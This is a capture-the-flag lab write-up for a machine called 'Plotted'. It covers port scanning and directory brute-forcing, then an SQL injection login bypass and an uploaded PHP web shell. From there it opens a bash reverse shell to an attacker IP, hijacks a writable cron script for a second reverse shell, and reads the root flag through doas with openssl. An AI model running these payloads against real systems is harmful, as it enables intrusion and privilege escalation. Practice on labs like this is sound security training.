# PLOTTED
## User Flag:

This one has a default apache page on port 80, as well as port 445 open, SMB shares.

If you directory bruteforce the site using dirbuster

`gobuster dir -u http://10.65.134.21 -w /usr/share/wordlists/dirb/common.txt`

You will find 3 sites, **/admin**, **/passwd**, and **/shadow**, all of which have base64 encoded strings that basically tell u it isn't this easy. Well, I guess we'll just have to find another way.

After we do a full scan, we can see that the SMB share is actuall running on Apache
```
nmap -p- -sV -sC -T4 10.65.134.21 -oA full_scan
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 12:50 -0400
Nmap scan report for 10.65.134.21
Host is up (0.038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.75 seconds
```

So, lets directory bruteforce on that port instead of just 80:

`gobuster dir -u http://10.65.134.21:445 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old`

And we can find:

`management           (Status: 301) [Size: 322] [--> http://10.65.134.21:445/management/]`

This path leads to a login page, and from there, if we run a test login through burpsuite, we can see this on the backend:

`{"status":"incorrect","last_qry":"SELECT * from users where username = 'user' and password = md5('pass') "}`

We can see that they're passing the variables directly into the command, so we can do some SQL injection, if we run `admin' OR 1=1-- -` into the username and then type anything in the pass, we will end up in the admin panel

*In CTFs, -- - is often preferred because it's more reliable across different PHP configurations and database drivers. The extra dash ensures the comment works even if spaces are stripped or the request is parsed in unexpected ways.*

Now I went through a lot of testing on this website to find this, but eventually you will realize that you can submit files and create new drivers/users. If you create a new driver in the page:
**http://10.65.155.167:445/management/admin/?page=drivers**

Then you can submit a .php file that has for instance
```
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

And then you can open the image by editing the page which leads you to 

`http://10.65.155.167:445/management/uploads/drivers/5.php`

Then you can submit a command for a reverse shell, which I did like so:

`http://10.65.155.167:445/management/uploads/drivers/5.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.216.167%2F4444%200%3E%261%22`

And I was good to go, made it into **www-data**

Past this point, I checked around and found not a whole lot we could actually do, but we found a foothold if we check the cron jobs at

`cat /etc/crontab`

This revealed a critical line which stated:

`* * * * * plot_admin /var/www/scripts/backup.sh`

We could cat into it and see it was:
```
cat /var/www/scripts/backup.sh
ls -la /var/www/scripts/backup.sh
```

We found it was owned by plot_admin with permission -rwxrwxr--. This meant that we had read only access to the file. Now we can't modify it directly, but what about replacing it? If we check the directory permissions, 

`find / -writable -type d 2>/dev/null | grep -v proc | head -20`

We can find that we can write to /var/www/scripts, which is where the file is located
So we just move the file to a new file, 

`mv /var/www/scripts/backup.sh /var/www/scripts/backup.sh.original`

And we make our own new backup.sh with no bad intentions:
```
cat > /var/www/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.216.167/4444 0>&1
EOF
```
Make it executable with `chmod +x /var/www/scripts/backup.sh`
And then we set up our listener with `nc -lvnp 4444` and wait 1 minute for the cron job to hit...
And we make it into plot_admin since the cron job specified that plot_admin was the one running the command, didn't matter who owned it, it's just who runs it. And we use their account to create a bash terminal for us.

## Root Flag:
Not gonna lie, the root flag is super simple, we just run linpeas or `find / -perm /4000 2>/dev/null` and we can find that we are able to run the **doas** application with root and use openssl. You can research on GTFOBins on how to use openssl and read the root flag

`doas openssl enc -in /root/root.txt -out /tmp/flag.txt`
